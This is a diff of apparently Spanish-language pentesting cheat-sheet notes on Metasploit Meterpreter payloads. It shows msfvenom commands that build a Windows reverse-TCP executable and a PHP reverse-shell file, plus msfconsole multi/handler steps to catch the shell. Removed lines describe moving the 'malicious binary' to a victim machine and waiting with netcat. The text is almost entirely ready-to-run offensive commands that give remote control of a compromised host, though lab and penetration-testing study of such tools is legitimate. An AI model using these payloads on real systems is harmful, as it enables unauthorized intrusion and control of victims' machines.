@@ -21,14 +21,6 @@ Msfconsole: Es una utilidad de línea de comando que puede ser usada para genera
 
 ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
 ```
-
-Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP y en la maquina victima lo podemos descargar desde el navegador colocando la IP del servicio compartido
-
-```bash 
-❯ rlwrap nc -nlvp 443   # Nos ponemos en escucha por Netcat
-
-# Ejecutamos el binario que subimos a Windows y ganamos acceso
-```
 ### Linux Meterpreter
 
 ```bash 
@@ -42,10 +34,19 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 	# LPORT = Local Port Atacante
 ```
 
-```bash 
-❯ nc -nlvp 443
+## PHP Meterpreter
 
-# Ejecutamos el binario que subimos a Linux y ganamos acceso
+```bash 
+❯ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=4444 -f raw > cmd.php 
+
+# Recibir la revershell con Metasploit
+❯ msfconsole -q 
+❯ use exploit/multi/handler
+	❯ options 
+	❯ set payload php/meterpreter/reverse_tcp
+	❯ set LHOST 172.0.0.1
+	❯ set LPORT 4444
+	❯ run 
 ```
 
 ## IIS - WebDAV
